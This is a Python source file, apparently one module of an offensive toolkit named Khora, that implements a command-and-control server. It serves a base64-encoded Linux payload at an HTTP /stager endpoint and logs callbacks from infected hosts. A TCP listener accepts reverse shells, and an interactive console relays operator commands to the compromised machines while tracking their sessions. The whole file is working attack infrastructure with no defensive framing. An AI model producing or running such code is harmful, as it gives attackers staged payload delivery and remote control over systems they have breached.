"""
Control channel module for staged payload delivery and shell handling.
"""

from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import logging
import socket
import threading
import time

logger = logging.getLogger("Khora.C2")


class SessionManager:
    """Manage active control sessions."""

    def __init__(self):
        self.sessions = {}
        self.session_lock = threading.RLock()

    def create_session(self, client_id, addr):
        with self.session_lock:
            self.sessions[client_id] = {
                "addr": addr,
                "connected_at": datetime.now(),
                "last_activity": datetime.now(),
                "commands_executed": 0,
                "command_history": [],
                "status": "active",
            }
            logger.info(f"Session created: {client_id} from {addr}")

    def update_session(self, client_id, activity=None):
        with self.session_lock:
            if client_id in self.sessions:
                self.sessions[client_id]["last_activity"] = datetime.now()
                if activity:
                    self.sessions[client_id]["commands_executed"] += 1
                    self.sessions[client_id]["command_history"].append(
                        {
                            "cmd": activity,
                            "time": str(datetime.now()),
                        }
                    )

    def list_sessions(self):
        with self.session_lock:
            return list(self.sessions.keys())

    def get_session_info(self, client_id):
        with self.session_lock:
            return self.sessions.get(client_id)


class C2Module:
    """Provide HTTP staging and TCP shell handling."""

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.session_manager = SessionManager()
        self.active_clients = {}
        self.clients_lock = threading.RLock()

    def http_server(self):
        """Serve staged payloads and receive callback data."""
        module = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.debug(f"HTTP: {format % args}")

            def do_GET(self):
                if self.path == "/stager":
                    try:
                        with open("payloads/linux_x64_meter.elf", "rb") as handle:
                            data = base64.b64encode(handle.read()).decode()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/plain")
                        self.end_headers()
                        self.wfile.write(data.encode())
                        logger.info(f"Stager served to {self.client_address[0]}")
                    except FileNotFoundError:
                        logger.warning("Stager payload not found")
                        self.send_response(404)
                        self.end_headers()
                    except Exception as exc:
                        logger.error(f"GET error: {exc}")
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                """Receive callback data from staged clients."""
                try:
                    content_len = int(self.headers.get("Content-Length", 0))
                    data = self.rfile.read(content_len).decode()

                    client_addr = self.client_address[0]
                    with module.clients_lock:
                        if client_addr not in module.active_clients:
                            module.session_manager.create_session(client_addr, self.client_address)
                        module.session_manager.update_session(client_addr, "callback")

                    logger.info(f"Callback from {client_addr}: {data[:50]}")

                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"OK")
                except Exception as exc:
                    logger.error(f"POST error: {exc}")
                    self.send_response(400)
                    self.end_headers()

        server = HTTPServer((self.lhost, 8080), Handler)
        logger.info(f"HTTP control service started: http://{self.lhost}:8080")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()

    def tcp_listener(self):
        """Start the TCP listener for reverse shells."""
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.lhost, self.lport))
        listener.listen(20)
        logger.info(f"TCP listener: {self.lhost}:{self.lport}")
        print(f"[+] TCP listener: {self.lhost}:{self.lport}")

        try:
            while True:
                try:
                    client, addr = listener.accept()
                    client_id = f"{addr[0]}:{addr[1]}"

                    self.session_manager.create_session(client_id, addr)
                    with self.clients_lock:
                        self.active_clients[client_id] = client

                    print(f"[+] Session connected: {client_id}")
                    logger.info(f"Shell connected: {client_id}")

                    thread = threading.Thread(
                        target=self.handle_shell,
                        args=(client, addr, client_id),
                        daemon=True,
                    )
                    thread.start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            listener.close()

    def handle_shell(self, client, addr, client_id):
        """Handle an individual shell session."""
        try:
            client.send(b"Khora shell> ")
            while True:
                try:
                    cmd = input(f"shell[{client_id}]> ")

                    if cmd.lower() == "exit":
                        client.send(b"exit\n")
                        break
                    if cmd.lower() == "history":
                        info = self.session_manager.get_session_info(client_id)
                        for entry in info["command_history"][-10:]:
                            print(f"  {entry['time']}: {entry['cmd']}")
                        continue
                    if cmd.lower().startswith("sessions"):
                        active = self.session_manager.list_sessions()
                        print(f"[+] Active sessions: {len(active)}")
                        for sess in active:
                            info = self.session_manager.get_session_info(sess)
                            print(f"    {sess} - {info['commands_executed']} cmds")
                        continue

                    if cmd.strip():
                        self.session_manager.update_session(client_id, cmd)
                        client.send((cmd + "\n").encode())

                        result = client.recv(4096).decode("utf-8", errors="ignore")
                        print(result, end="")
                except (ConnectionResetError, BrokenPipeError):
                    print(f"\n[-] {client_id} disconnected")
                    break
        except Exception as exc:
            logger.error(f"Shell error for {client_id}: {exc}")
        finally:
            client.close()
            with self.clients_lock:
                if client_id in self.active_clients:
                    del self.active_clients[client_id]
            logger.info(f"Session ended: {client_id}")


def run(target, lhost, lport=4444):
    """Module entrypoint."""
    print(f"\n{'=' * 70}")
    print("CONTROL CHANNEL MODULE".center(70))
    print("=" * 70)
    print(f"Target: {target}")
    print(f"HTTP staging: http://{lhost}:8080/stager")
    print(f"TCP listener: {lhost}:{lport}\n")

    logger.info(f"Control module starting on {lhost}:{lport}")

    module = C2Module(lhost, lport)
    http_thread = threading.Thread(target=module.http_server, daemon=True)
    http_thread.start()
    time.sleep(0.5)

    try:
        module.tcp_listener()
    except KeyboardInterrupt:
        print("\n[+] Control services stopped")

    print(f"{'=' * 70}\n")
    logger.info("Control module terminated")
